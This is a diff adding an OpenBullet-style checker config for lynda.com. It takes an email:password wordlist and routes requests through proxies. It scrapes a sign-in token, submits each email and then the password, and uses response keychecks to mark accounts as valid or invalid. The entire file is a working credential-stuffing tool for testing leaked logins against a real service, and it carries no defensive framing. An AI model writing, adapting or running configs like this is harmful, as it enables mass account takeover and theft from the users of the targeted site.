@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Lynda_user-test",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-13T19:21:51.5077988+00:00",
+  "AdditionalInfo": "",
+  "Author": "pin2",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "1",
+      "Id": 251266271
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 594063740
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.lynda.com/signin" AutoRedirect=TRUE 
+  CONTENT "https://www.lynda.com/signin" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"-_-\":\"" "\"" Recursive=FALSE -> VAR "-_-" "" "" 
+#POST REQUEST POST "https://www.lynda.com/ajax/signin/password" AutoRedirect=TRUE 
+  CONTENT "-_-=<-_->&email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "-_-: <-_->" 
+  HEADER "Host: www.lynda.com" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin/lynda" 
+PARSE "<SOURCE>" LR "name=\\"-_-\\" value=\\"" "\\"" Recursive=FALSE -> VAR "8-_-8" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we do not recognize that email or username" 
+  KEYCHAIN Success OR 
+    KEY "Welcome back! Please sign in" 
+REQUEST POST "https://www.lynda.com/ajax/signin/user" AutoRedirect=TRUE 
+  CONTENT "-_-=<8-_-8>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "-_-: <8-_-8>" 
+  HEADER "Host: www.lynda.com" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin/password" 
+PARSE "<SOURCE>" LR "{" "}" Recursive=FALSE -> CAP "READ" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The username or password is invalid" 
+  KEYCHAIN Failure OR 
+    KEY "The username or password is invalid" 
